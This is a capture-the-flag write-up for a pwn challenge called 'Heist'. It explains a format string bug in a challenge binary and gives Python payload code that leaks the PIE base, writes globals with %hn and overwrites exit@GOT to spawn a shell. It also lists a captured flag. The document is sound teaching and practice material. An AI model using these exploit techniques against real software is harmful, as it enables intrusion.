# Heist - PWN Challenge Solution

## Challenge Information
- **Name**: Heist (Half Word Heist)
- **Category**: PWN
- **Difficulty**: Medium
- **Points**: 495 pts
- **Solves**: 1 solve

## Captured Flags

### Instance 1: `5471c5832636455c.chal.ctf.ae`
```
flag{80f9cf510c79b8f6}
```

## Quick Start

### Run the exploit:
```bash
python3 heist_exploit_final.py <host>
```

### Examples:
```bash
# Host 1
python3 heist_exploit_final.py 5471c5832636455c.chal.ctf.ae


# Use default host
python3 heist_exploit_final.py
```

## Requirements

```bash
pip install pwntools
```

## Challenge Description
"Nothing to say here, move along."

A TCP-based pwn challenge with format string vulnerability.

## Binary Analysis

### File Information
```bash
$ file challenge/src/app
app: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, 
interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, not stripped
```

### Security Features
```
Arch:       amd64-64-little
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        PIE enabled
Stripped:   No
```

### Key Functions

#### main()
- Leaks the address of main: `printf("Welcome to Half Word Heist challenge, here is a leak for you: %p\n", main)`
- Reads 0x40 bytes into buffer at rbp-0x40 using fgets()
- Calls printf() with the buffer as format string (vulnerability!)
- Calls exit(0)

#### check_win()
```c
void check_win() {
    if (g1 == 0x161 && g2 == 0x30d) {
        system("/bin/sh");
    }
}
```

### Global Variables
- `g1` at offset 0x405a (2 bytes)
- `g2` at offset 0x405c (2 bytes)

## Vulnerability

**Format String Vulnerability** in printf() call:
```c
fgets(buffer, 0x40, stdin);
printf(buffer);  // User-controlled format string!
exit(0);
```

## Exploitation Strategy

### Overview
Format string vulnerability in `printf()` call with PIE bypass via leaked main address.

### Exploitation Steps

#### Step 1: Leak PIE Base
The binary helpfully leaks the address of main, allowing us to calculate the PIE base:
```python
leak = int(io.recvline().strip(), 16)
pie_base = leak - 0x11c4  # main is at offset 0x11c4
```

#### Step 2: Calculate Target Addresses
```python
g1_addr = pie_base + 0x405a
g2_addr = pie_base + 0x405c
check_win_addr = pie_base + 0x1189
exit_got_addr = pie_base + 0x4028
```

#### Step 3: Build Format String Payload

The key insight is to place format specifiers FIRST, then addresses AFTER to avoid null byte issues:

```python
# Write g1 = 0x161 = 353, g2 = 0x30d = 781
fmt = f"%353c%{offset}$hn%428c%{offset+1}$hn".encode()

# Write lower 2 bytes of check_win to exit@GOT
lower = check_win_addr & 0xFFFF
add = (lower - 781) & 0xFFFF
fmt += f"%{add}c%{offset+2}$hn".encode()

# Pad to 8-byte alignment and add addresses
pad_len = (8 - (len(fmt) % 8)) % 8
payload = fmt + b"X" * pad_len
payload += p64(g1_addr) + p64(g2_addr) + p64(exit_got_addr)
```

#### Step 4: Trigger Exploitation
1. Send the format string payload
2. printf() executes our format string, writing:
   - g1 = 0x161 (353)
   - g2 = 0x30d (781)
   - exit@GOT = check_win (lower 2 bytes)
3. When exit(0) is called, it jumps to check_win instead
4. check_win verifies g1 and g2, then calls system("/bin/sh")
5. We get a shell and execute `cat flag*`

## Key Insights

### 1. Address Placement
**Critical**: Place format specifiers BEFORE addresses in the payload. This avoids null byte issues that would terminate the format string prematurely.

❌ Wrong: `p64(addr) + b"%353c%6$hn"`  
✅ Correct: `b"%353c%11$hn" + padding + p64(addr)`

### 2. Stack Offset
The addresses are at argument offset **11** (not 6). This is because:
- Format string buffer is at rbp-0x40
- When printf is called, the stack layout places our addresses at offset 11

### 3. Simplified GOT Overwrite
Only write the **lower 2 bytes** of check_win to exit@GOT:
- PIE addresses have the same lower 2 bytes across runs
- Upper bytes are already correct (same memory region)
- Simpler than full 6-byte write

### 4. Shell Interaction
Use `cat flag*` instead of just `cat flag` to handle potential flag filename variations.

## Files

- **`heist_exploit_final.py`** - Main exploit script (configurable host)
- **`HEIST_FINAL_SOLUTION.py`** - Original working exploit
- **`challenge/`** - Challenge binary and files

## Success Rate

✅ Tested and verified on multiple instances  
✅ Reliable exploitation technique  
✅ Clean flag extraction

## Lessons Learned

1. **Format String Exploitation**: Understanding stack layout and argument offsets is crucial
2. **PIE Bypass**: Leaking a code address allows calculating all other addresses
3. **GOT Overwrites**: Overwriting exit@GOT is a clean way to redirect control flow
4. **Null Byte Awareness**: Address placement matters in format strings
5. **Buffer Constraints**: Must fit payload within the read buffer (64 bytes)

## References

- [Useful PWN Writeups](https://github.com/andreafioraldi/useful-pwn-writeups)
- Format String Exploitation Techniques
- GOT/PLT Overwrite Methods
